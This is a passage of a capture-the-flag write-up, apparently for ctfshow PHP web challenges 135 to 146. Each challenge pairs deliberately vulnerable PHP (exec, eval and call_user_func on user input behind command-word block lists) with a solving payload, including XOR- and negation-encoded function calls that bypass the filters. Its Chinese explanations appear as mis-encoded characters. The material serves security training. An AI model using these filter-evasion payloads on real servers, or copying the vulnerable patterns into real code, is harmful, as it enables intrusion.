class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?F=`$F `;cp flag.php 1.txt  è®¿é—®1.txt</code></p><ul><li>è¿‡æ»¤äº†catï¼Œcurlç­‰å‘½ä»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨Dnslogå¤–å¸¦è·å–æ•°æ®å¾ˆå›°éš¾</li><li>ä¸å¦¨å°†flag.phpæ‹·è´åˆ°åˆ«çš„æ–‡ä»¶ï¼Œåœ¨è®¿é—®åˆ«çš„æ–‡ä»¶è·å¾—flag</li></ul><h1 id="web136-linuxå‘½ä»¤ï¼Œtee"><a href="#web136-linuxå‘½ä»¤ï¼Œtee" class="headerlink" title="web136(linuxå‘½ä»¤ï¼Œtee)"></a>web136(linuxå‘½ä»¤ï¼Œtee)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?c=ls /|tee 1 ?c=cat /f149_15_h3r3|tee 2 è®¿é—®2ä¸‹è½½æ–‡ä»¶ï¼ŒæŸ¥çœ‹</code></p><ul><li>teeå‘½ä»¤ï¼šç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶<ul><li><code>tee file1 file2</code>ï¼šå¤åˆ¶æ–‡ä»¶</li><li><code>ls /|tee 1.txt</code>ï¼šå‘½ä»¤è¾“å‡º</li></ul></li></ul><h1 id="web137-è°ƒç”¨å‡½æ•°"><a href="#web137-è°ƒç”¨å‡½æ•°" class="headerlink" title="web137(::è°ƒç”¨å‡½æ•°)"></a>web137(::è°ƒç”¨å‡½æ•°)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p><code>payload: ctfshow=ctfshow::getFlag</code></p><ul><li>å‡½æ•°çš„è°ƒç”¨<ul><li><code>::</code>ï¼šè°ƒç”¨ç±»ä¸­çš„å‡½æ•°</li></ul></li></ul><h1 id="web138-call-user-funcä¼ æ•°ç»„"><a href="#web138-call-user-funcä¼ æ•°ç»„" class="headerlink" title="web138(call_user_funcä¼ æ•°ç»„)"></a>web138(call_user_funcä¼ æ•°ç»„)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strripos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]); </span><br></pre></td></tr></table></figure><p><code>payload: ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code></p><ul><li><p><code>call_user_func</code>å›è°ƒå‡½æ•°è°ƒç”¨ç±»é‡Œé¢çš„æ–¹æ³•</p></li><li><p><code>call_user_func(array($classname, &#39;say_hello&#39;));</code><br>å°†è°ƒç”¨$calssnameç±»é‡Œé¢çš„<code>say_hello</code>çš„æ–¹æ³•</p></li></ul><h1 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h1><ul><li>å’¦ï¼Ÿæ€ä¹ˆä¸èƒ½ä¸‹è½½æ–‡ä»¶äº†ï¼Ÿ</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload:</code></p><h1 id="web140-intval-å¼±æ¯”è¾ƒ"><a href="#web140-intval-å¼±æ¯”è¾ƒ" class="headerlink" title="web140(intval()å¼±æ¯”è¾ƒ)"></a>web140(intval()å¼±æ¯”è¾ƒ)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: f1=md5&amp;f2=md5</code></p><ul><li>æƒ³è¦è¾“å‡ºflagï¼Œåªéœ€è®©<code>intval($code)</code>ä¸ºé›¶å³å¯</li><li>ä¾‹ï¼š</li></ul><blockquote><p>md5(phpinfo())<br>md5(sleep())<br>md5(md5())<br>current(localeconv)<br>sha1(getcwd())<br>sha1(sha1())</p></blockquote><h1 id="web141-å¼‚æˆ–"><a href="#web141-å¼‚æˆ–" class="headerlink" title="web141(å¼‚æˆ–)"></a>web141(å¼‚æˆ–)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=2&amp;v3=-(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)-</code></p><ul><li>ä¼ çš„ä¸‰ä¸ªå‚æ•°ä¸­ï¼Œ<code>v1</code>å’Œ<code>v2</code>å¿…é¡»ä¸ºæ•°å­—ï¼Œ<code>v3</code>ä¸­ä¸èƒ½æœ‰æ•°å­—ã€å­—æ¯ã€ä¸‹åˆ’çº¿</li></ul><blockquote><p>æµ‹è¯•ä¸€ä¸‹</p><p>å‡è®¾æˆ‘ä»¬è¦æ‰§è¡Œçš„ä»£ç ä¸º<code>phpinfo();</code>ï¼Œå…¶ä¸­<code>;</code>å·²ç»æä¾›äº†ï¼Œ<code>v1</code>å’Œ<code>v2</code>éœ€è¦ä¸ºæ•°å­—ï¼Œæ‰€ä»¥åªèƒ½åœ¨<code>v3</code>å¤„ä¼ å‚ã€‚</p><p>ç»è¿‡æœ¬åœ°æµ‹è¯•å‘ç°ï¼š<br>å½“ä»£ç ä¸º<code>phpinfo();</code>æ—¶ï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œä»£ç <br>å› ä¸º<code>()</code>ä¸ç¬¦åˆ<code>v3</code>çš„é™å®šæ¡ä»¶ï¼Œæ‰€ä»¥<code>v3</code>ä¸­å¯ä»¥æœ‰<code>()</code></p><p>å½“ä»£ç ä¸º<code>1+phpinfo()+1;</code>æ—¶ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œä»£ç <br>æ‰€ä»¥<code>v1</code>å’Œ<code>v2</code>å€¼å°±å¯ä»¥ç¡®å®šä¸ºä»»æ„æ•°å­—ï¼Œå¹¶ä¸”é€šè¿‡<code>+</code>æˆ–<code>-</code>è¿æ¥</p><p>å½“ä»£ç ä¸º<code>2+(&#39;phpinfo&#39;)()+2;</code>æ—¶ï¼Œå‘ç°ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œ<br>æ­¤æ—¶å°±å¯ä»¥ç¡®å®š<code>v3</code>å‚æ•°åˆ†ä¸ºä¸‰éƒ¨åˆ†ç»„æˆï¼Œå‰é¢ä¸€éƒ¨åˆ†æ˜¯<code>+</code>ï¼Œä¸­é—´ä¸º<code>()</code>é‡Œé¢æ˜¯æƒ³è¦æ‰§è¡Œçš„ä»£ç ï¼Œåé¢çš„ä¸€éƒ¨åˆ†ä¸º<code>()+</code></p><p>åœ¨ä¸­é—´çš„ä¸€éƒ¨åˆ†ä¸­ï¼Œå› ä¸ºä¸èƒ½æœ‰æ•°å­—ã€å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨å¼‚æˆ–çš„æ–¹æ³•æ„é€ æ¶æ„ä»£ç ä½¿å…¶æ‰§è¡Œã€‚</p></blockquote><ul><li>è§£é¢˜æ€è·¯ï¼š</li></ul><blockquote><p>é€šè¿‡ä¸Šé¢çš„æµ‹è¯•å‘ç°å¯ä»¥æ­£å¸¸æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ ¹æ®è‡ªå·±æƒ³è¦çš„ä»£ç è¿›è¡Œå¼‚æ„å³å¯</p></blockquote><h1 id="web142-sleep"><a href="#web142-sleep" class="headerlink" title="web142(sleep)"></a>web142(sleep)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        <span class="title function_ invoke__">sleep</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=0</code></p><ul><li>ä»”ç»†å‘ç°é˜»ç¢æˆ‘ä»¬çš„åªæœ‰<code>sleep</code>å‡½æ•°ï¼Œæ‰€ä»¥åªéœ€è®©<code>$d</code>æ•°å€¼å°½å¯èƒ½åœ°å°å°±è¡Œ</li><li>æ‰€ä»¥æˆ‘ä»¬è®©ä¼ è¿›å»çš„<code>v1</code>å€¼ä¸º0å³å¯</li></ul><h1 id="web143-å¼‚æˆ–ï¼Œ"><a href="#web143-å¼‚æˆ–ï¼Œ" class="headerlink" title="web143(å¼‚æˆ–ï¼Œ*)"></a>web143(å¼‚æˆ–ï¼Œ*)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=2&amp;v3=*(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)*</code></p><ul><li>è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œä½†æ˜¯<code>*</code>å¹¶æ²¡æœ‰è¢«è¿‡æ»¤æ‰ï¼Œæ‰€ä»¥åªéœ€å°†141çš„<code>payload</code>çš„<code>-</code>æ¢æˆ<code>*</code>å³å¯</li></ul><h1 id="web144-å¼‚æˆ–"><a href="#web144-å¼‚æˆ–" class="headerlink" title="web144(å¼‚æˆ–)"></a>web144(å¼‚æˆ–)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v3=2&amp;v2=*(%aa%aa%aa%aa%aa%aa^%d9%d3%d9%de%cf%c7)(%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa%aa^%de%cb%c9%8a%cc%c6%cb%cd%84%da%c2%da)</code></p><ul><li>æ”¹ä¸€ä¸‹141<code>paylod</code>æ ¼å¼å³å¯</li></ul><h1 id="web145-æˆ–ï¼Œå–å"><a href="#web145-æˆ–ï¼Œå–å" class="headerlink" title="web145(æˆ–ï¼Œå–å)"></a>web145(æˆ–ï¼Œå–å)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?v1=1&amp;v2=2&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</code></p><ul><li><code>*</code>è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>|</code></li><li>å‘ç°<code>^</code>ä¹Ÿä¸èƒ½ç”¨äº†ï¼Œä¸èƒ½ç”¨å¼‚æˆ–äº†ï¼Œä½†æ˜¯<code>~</code>å¯ä»¥ç”¨ï¼Œæ‰€ä»¥æ–¹æ³•ä¸ºå–å</li></ul><h1 id="web146-æˆ–ï¼Œå–å"><a href="#web146-æˆ–ï¼Œå–å" class="headerlink" title="web146(æˆ–ï¼Œå–å)"></a>web146(æˆ–ï¼Œå–å)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span 